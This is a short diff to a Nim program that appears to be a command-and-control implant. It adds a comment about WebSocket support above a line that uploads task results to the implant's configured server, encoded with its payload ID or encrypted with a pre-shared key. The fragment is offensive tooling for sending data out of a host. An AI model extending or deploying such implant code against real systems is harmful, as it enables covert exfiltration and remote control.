@@ -198,6 +198,7 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                            }
                   
                   # let resp = await http.Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true) 
+                  # Will need to update this to support WebSockets too
                   let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                   when not defined(release):
                      echo "resp for upload: ", $(resp)
